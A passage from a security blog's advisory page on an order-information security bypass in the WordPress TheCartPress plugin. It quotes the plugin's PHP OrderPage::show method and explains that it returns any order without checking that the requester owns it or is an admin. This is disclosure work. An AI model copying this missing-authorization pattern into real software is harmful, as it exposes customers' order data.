        require_once( TCP_CLASSES_FOLDER . 'CartSourceDB.class.php' );
        $cart_table = new TCPCartTable( );
        return $cart_table-&gt;show( new TCP_CartSourceDB( $order_id, $see_address, $see_full, true, $see_comment ), $echo );
    }
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9877b9c098345629096-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b9c098345629096-2">2</div><div class="crayon-num" data-line="crayon-53c9877b9c098345629096-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b9c098345629096-4">4</div><div class="crayon-num" data-line="crayon-53c9877b9c098345629096-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b9c098345629096-6">6</div><div class="crayon-num" data-line="crayon-53c9877b9c098345629096-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9877b9c098345629096-8">8</div><div class="crayon-num" data-line="crayon-53c9877b9c098345629096-9">9</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9877b9c098345629096-1"><span class="crayon-t">class</span><span class="crayon-h"> </span><span class="crayon-e">OrderPage</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b9c098345629096-2">&nbsp;</div><div class="crayon-line" id="crayon-53c9877b9c098345629096-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">static</span><span class="crayon-h"> </span><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">show</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">order_id</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">see_comment</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-t">true</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">echo</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-t">true</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">see_address</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-t">true</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">see_full</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-t">false</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b9c098345629096-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">require_once</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-v">TCP_CLASSES_FOLDER</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-s">'CartTable.class.php'</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9877b9c098345629096-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">require_once</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-v">TCP_CLASSES_FOLDER</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-s">'CartSourceDB.class.php'</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b9c098345629096-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">cart_table</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">new</span><span class="crayon-h"> </span><span class="crayon-e">TCPCartTable</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9877b9c098345629096-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">cart_table</span><span class="crayon-o">-&gt;</span><span class="crayon-e">show</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-r">new</span><span class="crayon-h"> </span><span class="crayon-e">TCP_CartSourceDB</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">order_id</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">see_address</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">see_full</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-t">true</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">see_comment</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877b9c098345629096-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c9877b9c098345629096-9"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0065 seconds] -->
<p>This method effectively just fetches the order from database, and then returns it. There&#8217;s no reference to the active user, which is the gist of this vulnerability. A lack of validation of the requesting user being also the owner of the order, or an admin.</p>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="https://charlieeriksen.github.io/category/advisories/" title="View all posts in Advisories" rel="category tag">Advisories</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="https://charlieeriksen.github.io/tag/thecartpress/" rel="tag">TheCartPress</a>, <a href="https://charlieeriksen.github.io/tag/wordpress-plugin/" rel="tag">Wordpress plugin</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="https://charlieeriksen.github.io/2012/06/20/wordpress-thecartpress-plugin-order-information-security-bypass/#respond" title="Comment on WordPress TheCartPress plugin order information security bypass">Leave a comment</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-9 -->

				
					<nav id="nav-below">
		<h2 class="assistive-text">Post navigation</h2>

	
	</nav><!-- #nav-below -->
	
			
			</div><!-- #content -->
		</section><!-- #primary -->

			<div id="secondary" class="widget-area" role="complementary">
			<aside id="text-2" class="widget widget_text"><h3 class="widget-title">Upcoming advisories</h3>			<div class="textwidget"><p>SA51412<br />
SA51348<br />
SA51344<br />
SA51336 </p>
</div>
		</aside><aside id="categories-4" class="widget widget_categories"><h3 class="widget-title">Categories</h3>		<ul>
	<li class="cat-item cat-item-3"><a href="https://charlieeriksen.github.io/category/advisories/" title="View all posts filed under Advisories">Advisories</a> (34)
</li>
	<li class="cat-item cat-item-12"><a href="https://charlieeriksen.github.io/category/privacy/" title="View all posts filed under Privacy">Privacy</a> (5)
</li>
	<li class="cat-item cat-item-30"><a href="https://charlieeriksen.github.io/category/security/" title="View all posts filed under Security">Security</a> (7)
</li>
		</ul>
</aside>		<aside id="recent-posts-4" class="widget widget_recent_entries">		<h3 class="widget-title">Recent posts</h3>		<ul>
					<li>
				<a href="https://charlieeriksen.github.io/2013/08/20/graphite-remote-code-execution-vulnerability-advisory/">Graphite remote code execution vulnerability advisory</a>
						</li>
					<li>
				<a href="https://charlieeriksen.github.io/2013/08/06/squash-remote-code-execution-vulnerability-advisory/">Squash remote code execution vulnerability advisory</a>
						</li>
					<li>
				<a href="https://charlieeriksen.github.io/2013/06/18/bsides-rhode-island-presentation-and-slides/">BSides Rhode Island presentation and slides</a>
						</li>
					<li>
				<a href="https://charlieeriksen.github.io/2013/05/24/cve-2012-6399-or-how-your-cisco-webex-meetings-arent-very-confidential-on-ios/">CVE-2012-6399 &#8211; Or how your Cisco WebEx meetings aren&#8217;t very confidential on iOS</a>
						</li>
					<li>
				<a href="https://charlieeriksen.github.io/2013/05/16/credit-card-numbers-third-parties-and-you/">Credit card numbers, third parties and you</a>
						</li>
					<li>
				<a href="https://charlieeriksen.github.io/2013/05/09/cve-2013-2692-or-when-your-openvpn-is-a-bit-too-open/">CVE-2013-2692 &#8211; Or when your OpenVPN is a bit too open</a>
						</li>
					<li>
				<a href="https://charlieeriksen.github.io/2013/05/03/conditional-csrf-or-how-to-spray-without-praying/">Conditional CSRF &#8211; Or how to spray without praying</a>
						</li>
					<li>
				<a href="https://charlieeriksen.github.io/2013/05/01/wordpress-csrf-exploit-kit-a-novel-approach-to-exploiting-wordpress-plugins/">WordPress CSRF Exploit kit &#8211; A novel approach to exploiting WordPress plugins</a>
						</li>
					<li>
				<a href="https://charlieeriksen.github.io/2013/03/17/amd-catalyst-driver-update-vulnerability/">AMD Catalyst driver update vulnerability</a>
						</li>
					<li>
				<a href="https://charlieeriksen.github.io/2013/02/18/wordpress-online-store-local-file-inclusion-vulnerability/">WordPress Online Store local file inclusion vulnerability</a>
						</li>
				</ul>
		</aside>		</div><!-- #secondary .widget-area -->
	
	</div><!-- #main -->
	
	
	<footer id="colophon" role="contentinfo">
		<div id="site-generator">
						<a href="http://wordpress.org/" title="Semantic Personal Publishing Platform" rel="generator">Powered by WordPress</a> &amp;	<a href="http://wpshoppe.com/" title="Minimalist WordPress Themes" rel="generator">simpleX</a>.
					
		</div>
	</footer><!-- #colophon -->
	
		
</div><!-- #page -->


</body>
</html>
<!-- Performance optimized by W3 Total Cache. Learn more: http://www.w3-edge.com/wordpress-plugins/

Page Caching using disk: enhanced

 Served from: ceriksen.com @ 2014-07-18 20:45:47 by W3 Total Cache -->